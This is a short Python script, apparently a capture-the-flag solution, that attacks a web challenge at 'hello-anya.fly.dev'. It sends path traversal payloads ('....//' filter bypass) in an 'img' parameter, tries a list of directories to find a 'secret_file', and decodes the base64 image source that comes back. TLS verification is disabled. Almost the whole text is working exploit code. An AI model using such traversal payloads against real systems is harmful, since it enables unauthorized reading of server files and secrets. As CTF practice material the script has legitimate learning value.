import base64
import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = 'https://hello-anya.fly.dev'
possible_dir = 'db app app/sus config/hmm anya anya/very_secured_secret bin config storage test vendor'
for dir in possible_dir.split():
    file = dir + '/secret_file'
    params = {
        'img': f'....//{file}'
    }
    r = requests.get(URL, verify = False, params = params)
    soup = BeautifulSoup(r.text, 'html.parser')
    img_tag = soup.find('img', class_='styled-image')
    src_attr = img_tag['src']
    base64_string = src_attr.split(',')[1]
    try: 
        decoded = base64.b64decode(base64_string.encode('ascii'))
        print(dir, decoded.decode())
    except:
        print(dir, "file not found :(")

